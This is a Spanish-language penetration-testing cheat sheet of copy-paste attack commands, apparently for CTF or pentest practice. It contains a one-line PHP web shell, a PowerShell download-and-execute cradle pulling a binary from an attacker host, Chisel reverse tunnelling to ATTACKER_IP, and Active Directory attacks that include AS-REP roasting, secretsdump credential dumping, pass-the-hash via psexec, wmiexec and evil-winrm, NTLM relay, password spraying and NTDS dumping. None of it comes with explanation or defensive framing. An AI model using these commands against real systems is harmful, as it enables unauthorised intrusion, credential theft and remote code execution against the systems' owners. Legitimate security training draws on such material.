# Cheatsheet
Cosas copypaste

# Reverse Shells

Web Shell PHP
```
<?php system($_GET[cmd]);?>
```

# Powershell

Descargar binarios
```
powershell IEX(New-Object Net.WebClient).downloadString('http://IP:PORT/binario.binario')
```

# PostExplotacion

## Chisel

Atacante
```
./chisel server --reverse -p ATACKER_PORT
```

Víctima
```
./chisel client ATTACKER_IP:ATTACKER_PORT R:VICTIM_IP:VICTIM_PORT
```

## Mejorar Shell

Linux
```
script /dev/null -c bash
```
```
stty raw -echo ;fg
```
```
reset xterm
```
```
export TERM=xterm
```
```
export SHELL=bash
```

# Enumeracion

## Directory Listing & subdomain discovering

wfuzz

```
wfuzz -c --hc=404 -t 200 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.dominio.ext" url
```
Gobuster

```
gobuster vhost -u url -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

# Active Directory (AD)

Kerbrute

```
kerbrute -users userlist.txt -dc-ip IP -domain domain.local
```
ASREPRoasting

```
GetNPUsers.py -dc-ip IP domain.local/user -outputfile hashes.asreproast
```
DRSUAPI

```
secretsdump.py domain.local/USER:PASSWORD@IP
```
Pass the hash

```
evil-winrm -i IP -u user -H 'NTHash'
```
```
psexec.py domain.local/user@ip -hashes 'LMHASH:NTHASH'
```
```
wmiexec.py user@IP -hashes 'LMHASH:NTHASH'
```
SMB Relay

```
responder -I  NETINTERFACE rdw
```
NTLM Relay (SAM dumping without 'c' flag)

```
python3 ntlmrelayx.py -tf targets.txt -smb2support -c 'command' 
```
Domain Host Discovery

```
crackmapexec smb network/address
```
User & Password Spraying

```
crackmapexec smb network/address -u users -p passwords
```
NTDS dumping

```
crackmapexec smb network/address -u users -p passwords --ntds vss
```
